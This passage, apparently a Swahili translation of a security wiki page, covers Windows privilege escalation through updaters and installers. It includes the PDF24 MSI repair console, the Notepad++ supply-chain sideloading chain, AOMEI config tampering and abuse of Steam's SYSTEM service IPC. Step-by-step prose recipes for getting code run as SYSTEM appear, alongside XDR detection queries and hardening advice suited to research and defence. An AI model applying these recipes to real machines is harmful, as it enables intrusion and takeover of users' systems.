- Muundo huu unatumika pia kwa endpoint agents na updaters nyingine zinazoweka scripts za muda katika maeneo yanayoweza kuandikiwa na kila mtu, kisha kuzitekeleza kama SYSTEM. Jaribu majina yanayotabirika, ukosefu wa semantics za exclusive create, na mtiririko wa repair/update unaoweza kuanzishwa unapohitajika.

### Repair ya installer ya mwingiliano na console yenye haki za juu

PDF24 Creator 11.15.1 inaonyesha hatari tofauti ya MSI repair: custom action ya kusakinisha printer inaweza kufungua console inayoonekana yenye haki za SYSTEM wakati wa repair. Vendor alibadilisha MSI installer katika toleo la 11.15.2 ili kushughulikia tabia hii. Toleo la zamani la bidhaa ni kidokezo cha awali tu cha uchunguzi. Kagua kifurushi cha MSI kilichosajiliwa au kinachoweza kufikiwa, kama mtumiaji huyu anaweza kuanzisha repair, kama custom action iliyo hatarini na ucheleweshaji wa log file vipo, na kama desktop ya mwingiliano inaweza kuonyesha console. Ucheleweshaji ulioripotiwa ulitumia oplock kwenye `faxPrnInst.log`; uwezo wa kawaida wa kuandika faili si sharti pekee la ufikiaji. Shell isiyo ya mwingiliano, kifurushi kisichoweza kufikiwa, au installer iliyotiwa kiraka vinaweza kukatiza mlolongo huu. Suala hili halitegemei `AlwaysInstallElevated` na ni tofauti na kubadilisha script ya muda yenye jina linalotabirika.

---
## Utekaji wa supply chain wa mbali kupitia uthibitishaji dhaifu wa updater (WinGUp / Notepad++)

Kati ya Juni 2025 na Desemba 2025, washambuliaji waliovamia miundombinu ya hosting iliyokuwa nyuma ya mtiririko wa update wa Notepad++ waliwasilisha kwa kuchagua manifests hasidi kwa waathiriwa waliolengwa. Updaters za zamani zilizotumia WinGUp hazikuthibitisha kikamilifu uhalisi wa update, hivyo jibu hasidi la XML lingeweza kuelekeza wateja kwenye URL zinazodhibitiwa na washambuliaji. Kwa kuwa client ilikubali maudhui ya HTTPS bila kulazimisha uthibitishaji wa mnyororo wa cheti unaoaminika pamoja na sahihi halali ya PE kwenye installer iliyopakuliwa, waathiriwa walipakua na kutekeleza `update.exe` ya NSIS iliyotiwa trojan.<sup>[[12]](#references)[[13]](#references)</sup>

Mtiririko wa uendeshaji (hauhitaji exploit ya ndani):
1. **Kuingilia miundombinu**: vunja CDN/hosting na ujibu ukaguzi wa update kwa metadata ya mshambuliaji inayoelekeza kwenye URL hasidi ya upakuaji.
2. **NSIS iliyotiwa trojan**: installer hupakua/kutekeleza payload na kutumia misururu miwili ya utekelezaji:
   - **Kuleta binary iliyosainiwa na kufanya sideload**: jumuisha `BluetoothService.exe` iliyosainiwa na Bitdefender na uweke `log.dll` hasidi kwenye search path yake. Binary iliyosainiwa inapotekelezwa, Windows hufanya sideload ya `log.dll`, ambayo hufungua kwa decryption na kupakia kwa njia ya reflective backdoor ya Chrysalis (iliyolindwa na Warbird + API hashing ili kuzuia ugunduzi wa tuli).
   - **Uingizaji wa shellcode kupitia script**: NSIS hutekeleza script ya Lua iliyokompiliwa inayotumia Win32 APIs (k.m., `EnumWindowStationsW`) kuingiza shellcode na kuweka Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Mambo ya kuzingatia kwa hardening/ugunduzi wa auto-updater yoyote:
- Lazimisha **uthibitishaji wa cheti na sahihi** ya installer iliyopakuliwa (weka signer wa vendor kuwa anayeaminika, kataa CN/mnyororo usiolingana) na usaini manifest ya update yenyewe (k.m., XMLDSig). Zuia redirects zinazodhibitiwa na manifest isipokuwa zimethibitishwa.
- Chukulia **sideloading ya binary iliyosainiwa ya BYO** kama sehemu ya uchunguzi baada ya upakuaji: toa tahadhari signed vendor EXE inapopakia jina la DLL kutoka nje ya njia yake rasmi ya usakinishaji (k.m., Bitdefender inapopakia `log.dll` kutoka Temp/Downloads), na updater inapoweka/kutekeleza installers kutoka temp zenye sahihi zisizo za vendor.
- Fuatilia **alama mahususi za malware** zilizozingatiwa kwenye mlolongo huu (zinafaa kama viashiria vya jumla): mutex `Global\Jdhfv_1.0.1`, maandishi yasiyo ya kawaida ya `gup.exe` kwenye `%TEMP%`, na hatua za kuingiza shellcode zinazoendeshwa na Lua.
- Notepad++ iliimarisha WinGUp kuanzia v8.8.9 na matoleo ya baadaye: XML inayorejeshwa sasa husainiwa (XMLDSig), na build mpya hulazimisha uthibitishaji wa cheti na sahihi ya installer iliyopakuliwa badala ya kutegemea usafirishaji pekee.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading ya EXE iliyosainiwa na Bitdefender, `log.dll` (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> ikizindua kisakinishi kisicho cha Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Mifumo hii inaweza kutumika kwa updater yoyote inayokubali manifests zisizosainiwa au isiyohakikisha utambulisho wa watia-saini wa installer—utekaji wa mtandao + installer hasidi + sideloading iliyosainiwa na mshambuliaji huwezesha utekelezaji wa msimbo wa mbali kwa kisingizio cha sasisho “linaloaminika”.

### Usanidi wa arifa kama kichocheo cha pili cha sasisho

Updater inaweza kutumia usanidi tofauti wa mbali **kuandaa maudhui na kuanzisha utekelezaji wake**. Hili linahitaji udhibiti wa usanidi huo au majibu yake; ripoti hazielezi jinsi ufikiaji wa origin ulivyopatikana. Katika kisa cha AOMEI, `down_html.ini` ilichagua URL ya archive, toleo (`thrid`), na MD5 (`Val`); mshambuliaji alipandisha toleo na kubadilisha URL pamoja na checksum inayolingana. Huu ni [ukiukaji wa mpaka wa uaminifu wa metadata](#2-hijacking-the-update-channel-to-run-code-as-system) ulioelezwa hapo juu. Njia ya ziada ya utekelezaji ilikuwa `Notifycfg.ini`: ilielekeza `ABNotify.exe` kupakia `upgrade-now.html` iliyotolewa kwenye archive kupitia URL ya ndani ya `file:///` katika WebView. Ukurasa ulielekeza kiotomatiki kwenye executable iliyo kwenye folda hiyo hiyo, kisha WebView ikaikabidhi kwa shell ya mfumo. Mchakato child ulirithi ruhusa za notifier; hili halikuupandishia ruhusa moja kwa moja hadi SYSTEM.<sup>[[17]](#references)[[18]](#references)</sup>

Google pia iliripoti `Notifycfg.ini` iliyochezewa, ikiwa na zaidi ya sehemu dummy 35,000 zilizorudiwa, ambazo zilivuka kizuizi cha kawaida cha toleo cha client hii. Ripoti haithibitishi kuwa kuna njia ya jumla ya kukwepa parser. Mshambuliaji alirejesha faili za mbali baada ya vipindi vya dakika tano hadi kumi, kwa hiyo ni clients zilizofanya polling wakati wa vipindi hivyo pekee zilizopokea usanidi uliobadilishwa. Chaneli hii ya arifa pia ilikuwa na chambo tofauti cha [WebDAV/NTLM coercion](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion) ambacho hakikuhitaji archive itekelezwe.<sup>[[18]](#references)</sup>

---
## Uanzishaji kupitia shared memory kuelekea IPC ya huduma yenye ruhusa za juu

Usiishie kwenye kuorodhesha named pipes. Broker ya SYSTEM inaweza kufichua **file mapping** ya named yenye ruhusa pana kwa ajili ya kuanzisha muunganisho, kisha kunakili handles za anonymous pipe hadi kwenye mchakato unaoomba. Katika muundo wa Steam uliojaribiwa, `Global\SteamClientService_SharedMemFile` na `Global\SteamClientService_SharedMemLock` huratibu handshake ya client PID/event; huduma hurudisha handles mbili za pipe na maombi yanayofuata, yenye urefu uliotangulia, hutumia `RunInterface` (`0x01`). DACL ya mapping iliruhusu clients za kiwango chochote cha integrity. Objekti ya ndani `CSteamServiceWin32` katika `steamclient64.dll` ilitoa client inayofaa: tafuta global inayolingana na build, ita slot 0 ya vtable `Connect`, kisha tumia interface maps badala ya kutekeleza upya handshake. Kufikia IPC ni sharti la awali tu; uamuzi wa uaminifu wa handler yenye ruhusa za juu ndio huamua kama kuna escalation. <sup>[[19]](#references)[[20]](#references)</sup>

### Manifest iliyosainiwa huunda allowlist ya executable iliyopitwa na wakati

`IClientInstallUtils::AddInstallScriptToWhiteList` (slot 21) huthibitisha `kvsignatures` za VDF iliyosainiwa, lakini huhifadhi **pathname iliyopanuliwa ya executable**, si utambulisho usiobadilika wa faili. Kwa ingizo la `Run Process` lililosainiwa kama `%INSTALLDIR%\Binaries\Prerequisites\vcredist_x86_vs2008sp1.exe`, toa `%INSTALLDIR%` inayoweza kuandikwa na mtumiaji. Weka executable mbadala kwenye path hiyo hiyo iliyopanuliwa, kisha ita `RunInstallScript` (slot 22) kwa VDF isiyosainiwa ambayo `Process 1` yake inataja path iliyoruhusiwa. Ingizo hilo hubaki baada ya utekelezaji wa script iliyosainiwa hadi huduma iwashwe upya; kwenye utekelezaji ulioripotiwa, faili haithibitishwi tena kabla ya kuzinduliwa na SYSTEM. Linganisha jina la faili lililowekwa na ingizo halisi lililosainiwa, si kategoria ya prerequisite pekee. <sup>[[19]](#references)[[20]](#references)</sup>

### Mchakato child wa module-manager hukwepa ukaguzi wa saini wa direct-load

`IClientModuleManager::LoadModule` (slot 0) hukubali bytes za module ikiwa ID iliyotolewa inalingana na CRC32 yake. `CallFunctionAsync` (slot 3) yenye `flags & 8` huchagua tawi la **child-process**, badala ya tawi la direct reflective-load linalothibitisha saini ya Valve. Huduma huandika `legacycompat\servicecall_<CRC>.dll` na kuzindua `legacycompat\steamservice.exe /runfunc ...` kutoka kwenye installation directory. Ikiwa directory hiyo inaweza kuandikwa na mtumiaji, weka executable kwenye path ya mwisho, pakia module yoyote ya kutupa inayolingana na CRC, kisha ita njia ya async huku bit 3 ikiwa imewekwa. Executable ya child na DLL iliyoandikwa kwenye diski hazikuthibitishwa katika build iliyoripotiwa. Module yenyewe haihitaji kuwa payload inayofanya kazi: executable ya child iliyowekwa badala ndiyo huendeshwa kama SYSTEM. <sup>[[19]](#references)[[20]](#references)</sup>

### Ukaguzi wa catalog-member kabla ya usakinishaji wa driver wenye ruhusa za juu

Kwa broker ya usakinishaji wa driver, angalia kama uthibitishaji wa catalog unahusisha **INF halisi inayopitishwa kwa installer**. Katika njia iliyoripotiwa ya `InstallVrLinkDongleDriver`, `WinVerifyTrust` huthibitisha catalog na `CryptCATAdminCalcHashFromFileHandle` hutafuta *angalau faili moja* linalolingana kwenye directory iliyotolewa na caller, lakini huduma kisha huendesha `pnputil /add-driver ... /install` kwenye `netrtwlanuval.inf` bila kuthibitisha kuwa INF hii ndiyo mwanachama wa catalog aliyekusudiwa. Directory ya kawaida au maalum kwa architecture inakubaliwa. Kwa hiyo, catalog iliyosainiwa yenye faili yoyote inayolingana kwenye directory inaweza kupita ukaguzi dhaifu wa huduma hata kama INF inayokabidhiwa kwa installer yenye ruhusa za juu ni tofauti. Usidhani kuwa hili pekee linashinda sera ya Windows ya kusaini drivers: usakinishaji wenye mafanikio bado hutegemea package mbadala na sera ya host. <sup>[[19]](#references)[[20]](#references)</sup>

Huduma hufunga handles zake za uthibitishaji kabla `pnputil` haijafungua INF, na hivyo kuacha [pengo la TOCTOU](#1-toctou-inside-updater-copyexecute-paths-msi-center-cmd_autoupdatesdk) lenye hatua ya usakinishaji wa driver badala ya sasisho la executable. Oplock inaweza kutumika kupanga muda wa kubadilisha faili kati ya ukaguzi na kufunguliwa na installer. IPC hiyo hiyo hutoa [usambazaji wa ingizo la secure desktop](../authentication-credentials-uac-and-efs/uac-user-account-control.md#secure-desktop-input-forwarded-through-a-writable-shared-memory-ring) chini ya masharti tofauti ya idhini. <sup>[[19]](#references)</sup>

## References
- [1] [Taarifa ya usalama – Netskope Client for Windows – Kupandisha ruhusa za ndani kupitia seva rogue (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Taarifa ya usalama ya Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin ya Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – client/exploit ya Netskope IPC](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Kuvamia ASUS DriverHub, MSI Center, Acer Control Centre na Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Kupandisha ruhusa za ndani kupitia faili zinazoweza kuandikwa katika Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Kupandisha ruhusa katika Windows agent](https://checkmk.com/werk/16361)
- [10] [PoCs za sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Watendaji wa taifa hutumia mnyororo wa ugavi wa Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – sasisho kuhusu tukio la miundombinu iliyotekwa](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Kukwepa marekebisho ya CVE-2025-0309 katika Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Kugundua hitilafu za kupandisha ruhusa katika Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: Kutoka gRPC hadi SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [Maabara ya Uchambuzi wa Vitisho ya ManageEngine – Uvunjaji wa mnyororo wa ugavi wa AOMEI Backupper](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group na Mandiant – Kuchunguza uchezeaji wa muda mfupi wa mnyororo wa ugavi](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
- [19] [Atredis – Kumgeuza Valve](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [20] [Atredis – PoCs za Kumgeuza Valve](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
